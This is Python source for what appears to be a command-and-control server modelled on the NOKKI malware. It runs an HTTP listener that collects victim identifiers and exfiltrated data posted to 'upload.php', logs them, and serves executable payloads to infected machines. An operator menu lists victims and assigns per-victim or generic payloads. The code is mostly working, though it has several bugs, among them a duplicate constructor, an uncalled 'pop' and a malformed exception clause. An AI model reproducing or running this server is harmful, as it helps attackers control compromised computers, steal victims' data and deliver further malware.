#!/usr/bin/env python
# -*- coding: utf-8 -*-

import http.server
import socketserver
import os.path
from base64 import b64decode, b64encode
import threading
import logging
import os.path


victim_list = {}

class NOKKIvictim:
    # type = '[null]'  # request type: parse either 'file' or 'log': default to '[null]'
    # subject
    # time
    # date
    # data

    # victim_filename

    count_post = 0
    count_get = 0

    generic_filename = ''
    victim_filename = []

    def __init__(self, content_body):
        # does the parsing and variable assignment
        type_flag = 0  # flag used if req_type tag exists, adds one to make room for req_type

        # parse the data from the content body
        self.subject = content_body.split('&')[0][8:].split('-')[0]
        if len(content_body.split('&')[0][8:].split('-')) > 3:
            self.type = content_body.split('&')[0][8:].split('-')[1]
            type_flag = 1
        else:
            self.type = '[null]'
        self.time = content_body.split('&')[0][8:].split('-')[1 + type_flag]
        self.date = content_body.split('&')[0][8:].split('-')[2 + type_flag]
        self.data = content_body.split('&')[1][5:]

        self.req_count = 0

    def __init__(self, subject, time, date, data, type_):
        self.type = type_
        self.subject = subject
        self.time = time
        self.date = date
        self.data = data

    def inc_post_count(self):
        self.req_count += 1

    def inc_get_count(self):
        self.req_count += 1

    @staticmethod
    def set_generic_filename(filename):
        NOKKIvictim.generic_filename = filename  # TODO: do checks on file first, ret 0 if failed
        return NOKKIvictim.generic_filename

    def add_victim_filename(self, filename):  # allows for queuing of files
        self.victim_filename.append(filename)  # TODO: do checks on file first, ret 0 if failed

    @staticmethod
    def ret_generic_filename():
        return NOKKIvictim.generic_filename

    def ret_victim_filename(self):
        return self.victim_filename

    @staticmethod
    def ret_generic_file_data():
        gen_data = b''
        try:
            with open(NOKKIvictim.generic_filename, 'rb') as gen_file:
                gen_data = gen_file.read()
        except Exception():  # TODO: specify exception
            logging.error('Failed to return generic file data!')
            return b''
        else:
            return gen_data

    def ret_victim_file_data(self):  # pops off one filename from the array each call, returns data
        vic_data = b''
        vic_filename = self.victim_filename.pop
        try:
            with open(vic_filename, 'rb') as vic_file:
                vic_data = vic_file.read()
        except Exception():  # TODO: specify exception
            logging.error('Failed to return generic file data!')
            return b''
        else:
            return vic_data


class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        req_path = self.path
        logging.info(self.command + ": " + req_path)
        content_length = self.headers.get('Content-Length')

        if type(content_length) == str:  # parsing Content-Length value if exists
            if int(content_length) > 0:
                raise Exception('Received Content-Length on GET request.')
                # TODO: specify exception; used for debugging currently

        if req_path.endswith("/down"):  # Generic Upload to Request
            # response written to weewyesqsf4.exe on victim
            filename = 'generic_file.exe'
            logging.info('Generic Upload Request')

        elif req_path.endswith("-down"):  # Specific Upload to Request
            # response written to wirbiry2jsq3454.exe on victim
            victim_id = req_path.split('-down')[0][-10:]

            victim = victim_list.get(victim_id)
            if victim:
                victim.inc_get_count()  # adds one to the request count of the victim

            logging.info("victim_id: " + victim_id)
            filename = victim_id + '_file.exe'
            logging.info('Specific Upload Request')

        else:
            filename = ''  # TODO: will be necessary when below exception is changed
            raise Exception()  # TODO: better handle this exception

        if os.path.exists(filename):
            response_data = open(filename, 'rb').read()
        else:
            response_data = b'\x00'

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        return

    def do_POST(self):
        req_path = self.path
        logging.info(self.command + ": " + req_path)
        content_length = self.headers.get('Content-Length')

        req_body = str(self.rfile.read(int(content_length)), 'utf-8')

        if req_path.endswith('upload.php'):
            vic = NOKKIvictim(req_body)  # parse the data from the content body

            if not victim_list.get(vic.subject):  # check if already exists
                victim_list[vic.subject] = vic  # add victim to the victim to dict list

            victim_list[vic.subject].inc_post_count()  # adds one to the request count of the victim

            logging.info("Subject (%d): %s\n"
                         "Type: %s\n"
                         "Time/Date: %s %s\n"
                         "Data:\n%s" % (vic.req_count, vic.subject, vic.type, vic.time, vic.date, vic.data))
        else:
            raise Exception()  # TODO: specify exception after testing: used for debugging currently

        response_data = b''  # not required, the victim does not read response after POST request
        self.send_response(200)
        self.send_header("Content-req_type", "text/html")
        self.send_header("Content-Length", len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        return


def start_request_handler():
    try:
        httpd = socketserver.TCPServer(("0.0.0.0", 80), RequestHandler)
        httpd.serve_forever()
    except OSError:
        logging.error('Failed to start TCPSever RequestHandler')


def main_menu():
    menu_active = True
    menu_option = 0

    # DEBUG: testing data
    vic = NOKKIvictim('AAAAABBBBB', '11:08', '6/5/2020', 'asdfasfdasdfasdfasf', '[null]')
    victim_list[vic.subject] = vic
    vic = NOKKIvictim('WERWERWERR', '12:18', '6/4/2020', 'yuityuityuityuityui', '[null]')
    victim_list[vic.subject] = vic
    vic = NOKKIvictim('CVBNCVBNCV', '16:23', '6/9/2020', 'fghjhkbnmvmvbhjvjvj', '[null]')
    victim_list[vic.subject] = vic

    while menu_active:
        print('----------------------------------------')
        print(' (0) - List Victims')
        print(' (1) - Add Specific Payload')
        print(' (2) - Set Generic Payload')
        print(' (3) - Delete Victims')
        print(' (4) - Exit')
        print('----------------------------------------')
        try:
            menu_option = int(input(':'))
        except Exception(''):  # TODO: specify exception
            break

        if menu_option == 0:  # LIST VICTIMS
            print('Victims List')
            for key in victim_list:
                print(victim_list[key].subject + " : " + victim_list[key].data)
        elif menu_option == 1:
            print('Add Specific Payload')
            for key in victim_list:
                print(key + ') ' + victim_list[key].subject + ' : ' + victim_list[key].data)

            victim_key = ''
            while True:
                victim_key = input('Specify the victim for the specific file download.')
                if victim_key in victim_list:
                    print('Selected %s.' % victim_key)
                    break
                else:
                    print('That victim key does not exist.')

            while True:
                specific_filename = input('Provide a filename for the %s file download: ' % victim_key)
                if os.path.isfile(specific_filename):
                    if victim_list[victim_key].add_victim_filename(specific_filename):  # sets generic upload filename
                        break
                    else:
                        print('Failed to set specific upload filename! Try again.')
                elif specific_filename == 'no':
                    print('Canceling!')
                    break
                else:
                    print("Try another filename or type 'no' to cancel.")

        elif menu_option == 2:
            print('Set Generic Payload')
            while True:
                generic_filename = input('Provide a filename for the generic file download: ')
                if os.path.isfile(generic_filename):
                    if NOKKIvictim.set_generic_filename(generic_filename):  # sets generic upload filename
                        break
                    else:
                        print('Failed to set generic upload filename! Try again.')
                elif generic_filename == 'no':
                    print('Canceling!')
                    break
                else:
                    print("Try another filename or type 'no' to cancel.")
        elif menu_option == 2:
            pass
        elif menu_option == 4:
            print('Exiting!')
            menu_active = False
        else:
            print('Please provide another menu input.')


def main():
    # start logging to file, allows users to tail log
    logging.basicConfig(filename='nokki.log', level=logging.INFO)

    # start request handler thread, allows for both user and victim interface
    x = threading.Thread(target=start_request_handler, args=())
    x.start()

    main_menu()
    exit()


if __name__ == '__main__':
    main()
